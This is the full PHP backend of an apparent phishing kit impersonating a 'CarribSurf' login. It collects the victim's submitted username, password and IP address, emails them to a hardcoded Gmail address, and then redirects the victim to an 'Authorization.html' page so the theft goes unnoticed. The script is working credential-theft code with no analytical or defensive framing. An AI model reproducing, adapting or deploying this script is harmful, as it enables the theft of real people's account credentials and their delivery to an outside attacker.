<?

$adddate=date("D M d, Y g:i a");
$ip = getenv("REMOTE_ADDR");
$message .= "------------CarribSurf---------------------\n";
$message .= "User ID : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP           : ".$ip."\n";
$message .= "---------------GMONEY---------------\n";


$recipient = "zate123man@gmail.com";
$subject = "|CarribSurf|";
$header = "From:";
$header .= $_POST['eMailAdd']."\n";
$header .= "MIME-Version: 1.0\n";
         if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: Authorization.html");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>